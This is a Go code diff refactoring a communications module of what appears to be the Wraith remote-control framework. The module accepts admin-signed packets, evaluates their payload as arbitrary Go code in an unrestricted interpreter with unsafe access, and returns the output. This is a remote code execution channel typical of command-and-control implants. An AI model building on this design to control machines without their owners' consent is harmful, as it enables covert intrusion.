@@ -1,4 +1,4 @@
-package modulepinecomms
+package main
 
 import (
 	"bytes"
@@ -6,8 +6,6 @@ import (
 	"crypto/ed25519"
 	"encoding/hex"
 	"fmt"
-	"go/constant"
-	"go/token"
 	"math/rand"
 	"net/http"
 	"os"
@@ -19,6 +17,7 @@ import (
 
 	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/internal/proto"
 	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/internal/radio"
+	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/internal/symbols"
 	"dev.l1qu1d.net/wraith-labs/wraith/libwraith"
 	"github.com/traefik/yaegi/interp"
 	"github.com/traefik/yaegi/stdlib"
@@ -73,7 +72,7 @@ func (m *ModulePinecomms) handleRequest(ctx context.Context, w *libwraith.Wraith
 		return
 	}
 
-	packetData := proto.PacketReq{}
+	packetData := proto.PacketRR{}
 	err = proto.Unmarshal(&packetData, m.AdminPubKey, packet.Data)
 	if err != nil {
 		// The packet data is malformed, there is nothing more we
@@ -89,52 +88,43 @@ func (m *ModulePinecomms) handleRequest(ctx context.Context, w *libwraith.Wraith
 		Unrestricted: true,
 	})
 
-	// Generated with `yaegi extract libwraith`.
-	stdlib.Symbols["libwraith/libwraith"] = map[string]reflect.Value{
-		"SHMCONF_WATCHER_CHAN_SIZE":     reflect.ValueOf(constant.MakeFromLiteral("255", token.INT, 0)),
-		"SHMCONF_WATCHER_NOTIF_TIMEOUT": reflect.ValueOf(constant.MakeFromLiteral("1", token.INT, 0)),
-		"SHM_ERRS":                      reflect.ValueOf(constant.MakeFromLiteral("\"err\"", token.STRING, 0)),
-
-		"Config": reflect.ValueOf((*libwraith.Config)(nil)),
-		"Wraith": reflect.ValueOf((*libwraith.Wraith)(nil)),
-	}
-
-	stdlib.Symbols["wmpd/wmpd"] = map[string]reflect.Value{
+	symbols.Symbols["wmp/module"] = map[string]reflect.Value{
 		"ModulePinecomms": reflect.ValueOf((*ModulePinecomms)(nil)),
 	}
 
+	i.Use(symbols.Symbols)
 	i.Use(stdlib.Symbols)
 	i.Use(unsafe.Symbols)
 
 	var (
-		response     any
+		response     []byte
 		result       reflect.Value
-		communicator func(*ModulePinecomms, *libwraith.Wraith) any
+		communicator func(*ModulePinecomms, *libwraith.Wraith) []byte
 		ok           bool
 	)
 
-	_, err = i.Eval(packetData.Payload)
+	_, err = i.Eval(string(packetData.Payload))
 	if err != nil {
-		response = fmt.Errorf("could not evaluate due to error: %e", err)
+		response = []byte(fmt.Sprintf("could not evaluate due to error: %s", err.Error()))
 		goto respond
 	}
 
-	result, err = i.Eval("main.X")
+	result, err = i.Eval("main.Y")
 	if err != nil {
-		response = fmt.Errorf("could not find `main.X`: %e", err)
+		response = []byte(fmt.Sprintf("could not find `main.Y`: %s", err.Error()))
 		goto respond
 	}
 
 	if !result.IsValid() {
 		// The program didn't return anything for us to run, so assume everything
 		// is done and notify the user.
-		response = "program did not return anything"
+		response = []byte("program did not return anything")
 		goto respond
 	}
 
-	communicator, ok = result.Interface().(func(*ModulePinecomms, *libwraith.Wraith) any)
+	communicator, ok = result.Interface().(func(*ModulePinecomms, *libwraith.Wraith) []byte)
 	if !ok {
-		response = fmt.Errorf("returned function was of incorrect type (%T)", result.Interface())
+		response = []byte(fmt.Sprintf("returned function was of incorrect type (%T)", result.Interface()))
 		goto respond
 	}
 
@@ -153,7 +143,7 @@ func (m *ModulePinecomms) handleRequest(ctx context.Context, w *libwraith.Wraith
 	//
 
 respond:
-	responseData := proto.PacketRes{
+	responseData := proto.PacketRR{
 		Payload: response,
 		TxId:    packetData.TxId,
 	}
